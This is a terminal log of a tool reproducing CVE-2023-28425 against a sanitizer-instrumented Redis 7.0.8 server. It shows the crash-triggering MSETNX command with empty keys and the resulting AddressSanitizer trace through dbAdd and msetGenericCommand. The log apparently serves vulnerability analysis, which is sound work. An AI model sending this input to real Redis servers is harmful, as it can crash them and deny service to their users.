./r2f analyze CVE-2023-28425-poc
[*] waiting redi startup...
[*] Redi /usr/local/redis/src/redis-server StartUp.
line 4 trigger bug
MSETNX "" v�� "" -0.0
=================================================================
==172996==ERROR: AddressSanitizer: unknown-crash on address 0x0000800f7000 at pc 0x7f4e8a5c8956 bp 0x7fffd02130e0 sp 0x7fffd02128a0
READ of size 1048576 at 0x0000800f7000 thread T0
    #0 0x7f4e8a5c8955 in memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115
    #1 0x555741d27460 in memtest_preserving_test /opt/redis-7.0.8/src/memtest.c:317
    #2 0x555741cddd08 in memtest_test_linux_anonymous_maps /opt/redis-7.0.8/src/debug.c:1863
    #3 0x555741cde08a in doFastMemoryTest /opt/redis-7.0.8/src/debug.c:1904
    #4 0x555741cde95f in printCrashReport /opt/redis-7.0.8/src/debug.c:2047
    #5 0x555741cde95f in _serverAssert /opt/redis-7.0.8/src/debug.c:1015
    #6 0x555741c31b63 in dbAdd /opt/redis-7.0.8/src/db.c:191
    #7 0x555741c36ba8 in setKey /opt/redis-7.0.8/src/db.c:270
    #8 0x555741c74564 in msetGenericCommand /opt/redis-7.0.8/src/t_string.c:585
    #9 0x555741bd3b51 in call /opt/redis-7.0.8/src/server.c:3374
    #10 0x555741bd87fc in processCommand /opt/redis-7.0.8/src/server.c:4008
    #11 0x555741c16313 in processCommandAndResetClient /opt/redis-7.0.8/src/networking.c:2469
    #12 0x555741c16313 in processInputBuffer /opt/redis-7.0.8/src/networking.c:2573
    #13 0x555741c1e86f in readQueryFromClient /opt/redis-7.0.8/src/networking.c:2709
    #14 0x555741dfb294 in callHandler /opt/redis-7.0.8/src/connhelpers.h:79
    #15 0x555741dfb294 in connSocketEventHandler /opt/redis-7.0.8/src/connection.c:310
    #16 0x555741bbccb9 in aeProcessEvents /opt/redis-7.0.8/src/ae.c:436
    #17 0x555741bbf24c in aeProcessEvents /opt/redis-7.0.8/src/ae.c:362
    #18 0x555741bbf24c in aeMain /opt/redis-7.0.8/src/ae.c:496
    #19 0x555741bb10ac in main /opt/redis-7.0.8/src/server.c:7156
    #20 0x7f4e8a236c89 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #21 0x7f4e8a236d44 in __libc_start_main_impl ../csu/libc-start.c:360
    #22 0x555741bb2b70 in _start (/opt/redis-7.0.8/src/redis-server+0x10eb70) (BuildId: bae57496e088c12a62191271c8ba8cbf422ffc71)

Address 0x0000800f7000 is located in the low shadow area.
SUMMARY: AddressSanitizer: unknown-crash ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115 in memcpy
==172996==ABORTING
